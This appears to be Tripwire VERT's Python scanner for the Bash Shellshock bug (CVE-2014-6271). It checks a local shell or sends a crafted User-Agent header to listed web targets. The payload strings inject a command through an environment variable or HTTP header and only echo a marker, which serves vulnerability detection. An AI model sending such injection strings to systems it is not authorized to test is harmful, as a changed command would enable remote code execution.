#!/usr/bin/env python


'''
'
' Shellshock Test - CVE-2014-6271
' Written by Tripwire VERT (http://www.tripwire.com/vert)
' 
' This offline tool is not supported and is provided for informational purposes only.
' This tool uses Python - license information is available here: http://opensource.org/licenses/Python-2.0
'
'''
import argparse
import os
import urllib2
import urlparse
import sys

original_stdout = sys.stdout
local_test_case = 'env x=\x27() { :;}; echo Vulnerability Confirmed - CVE-$((2000+14))-6271\x27  bash -c "echo Tripwire CVE-2014-6271 Local Bash Test"'
http_test_case = '() \x7B :; \x7D; echo; echo Tripwire Test for CVE-$((2000+14))-6271;'

class Arguments(object):
    pass

class NoRedirect(urllib2.HTTPErrorProcessor):
    
    def http_response(self, request, response):
        return response
    
    https_response = http_response

arguments = Arguments()

parser = argparse.ArgumentParser(description='Tripwire VERT Test for CVE-2014-6271')
parser.add_argument('test_type', help='Test Local or Remote', choices=['local', 'remote'])
parser.add_argument('--path', nargs='?', const='/', default='/', help='Use with remote to specify a single page to scan')
parser.add_argument('--paths', nargs='?', const='paths.txt', type=argparse.FileType('r'), help='Scan a list of paths (default filename: paths.txt)')
parser.add_argument('--target', nargs='?', const='127.0.0.1:80', default='127.0.0.1:80', help='Scan Target for non-local scans. <target>:<port>')
parser.add_argument('--targets', nargs='?', const='targets.txt', type=argparse.FileType('r'), help='Scan a list of targets (default filename: targets.txt)')
parser.add_argument('--spider', nargs='?', const='/var/www/', default=False, help='Spider Local Path for pages to test')
parser.add_argument('--url', nargs='?', const='/', default='/', help='Specify the URL to append spidered pages to')
parser.add_argument('--log', nargs='?', const='results.log', type=argparse.FileType('w'), help='Log to a file instead of stdout')
parser.add_argument('--ssl', nargs='?', const=True, default=False, help='Test HTTPS')

args = parser.parse_args(namespace=arguments)

if arguments.log:
    sys.stdout = arguments.log
    
if arguments.ssl:
    schema = 'https://'
else:
    schema = 'http://'


if arguments.test_type == 'local':
    result = os.popen(local_test_case).read()
    if 'Vulnerability Confirmed - CVE-2014-6271' in result:
        print 'Local Bash Prompt has been confirmed vulnerable.'
elif arguments.test_type == 'remote':
    if not arguments.targets:
        targets = [arguments.target]
    else:
        targets = arguments.targets.readlines()
    pages = []
    if arguments.spider:
        for item in os.listdir(arguments.spider):
            if os.path.isfile(os.path.join(arguments.spider,item)):
                pages.append(urlparse.urljoin(arguments.url, item))
    else:
        if not arguments.paths:
            pages.append(arguments.path)
        else:
            pages = arguments.paths.readlines()
    for target in targets:
        target = target.strip()
        try:
            host, port = target.split(':')
        except ValueError:
            host = target
            if arguments.ssl:
                port = '443'
            else:
                port = '80'
        for page in pages:
            test_page = urlparse.urljoin('%s%s:%s' % (schema, host, port), page)
            fh = urllib2.build_opener(NoRedirect)
            request = urllib2.Request(test_page, headers={'User-Agent': http_test_case})
            try:
                result = fh.open(request).read()
            except Exception, msg:
                continue
            if 'Tripwire Test for CVE-2014-6271' in result:
                print '%s is vulnerable: %s' % (target, test_page)
        
    
    
if arguments.log:
    arguments.log.close()
    sys.stdout = original_stdout
